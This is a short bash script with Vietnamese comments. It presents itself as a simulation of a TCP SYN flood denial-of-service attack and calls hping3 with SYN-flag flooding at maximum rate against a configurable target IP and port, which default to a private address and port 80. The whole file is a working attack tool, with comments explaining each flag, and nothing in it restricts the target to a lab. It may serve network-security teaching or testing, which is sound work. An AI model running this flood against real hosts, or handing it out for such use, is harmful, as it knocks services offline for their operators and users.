#!/bin/bash
# ==============================================================================
# Tên script : ddos.sh
# Chức năng  : Mô phỏng tấn công từ chối dịch vụ (DDoS) loại TCP SYN Flood.
# Công cụ    : hping3
# ==============================================================================

TARGET_IP="${TARGET_IP:-10.0.0.1}"
TARGET_PORT="${TARGET_PORT:-80}"

echo "[*] Khởi chạy mô phỏng tấn công TCP SYN Flood..."
echo "[*] Nạn nhân (Victim): $TARGET_IP | Cổng dịch vụ (Port): $TARGET_PORT"
echo "[*] Nhấn [Ctrl+C] để kết thúc quá trình."

# ------------------------------------------------------------------------------
# Chú giải tham số thực thi:
#   -S      : Kích hoạt cờ SYN (Khởi tạo phiên bản bắt tay 3 bước TCP không hoàn chỉnh).
#   --flood : Phát sinh lưu lượng ở tốc độ tối đa, bỏ qua việc chờ gói tin phản hồi.
#   -V      : Chế độ Verbose (Hiển thị chi tiết luồng dữ liệu truyền tải).
#   -p      : Chỉ định cổng đích của dịch vụ bị nhắm tới.
# ------------------------------------------------------------------------------

hping3 -S --flood -V -p "$TARGET_PORT" "$TARGET_IP"
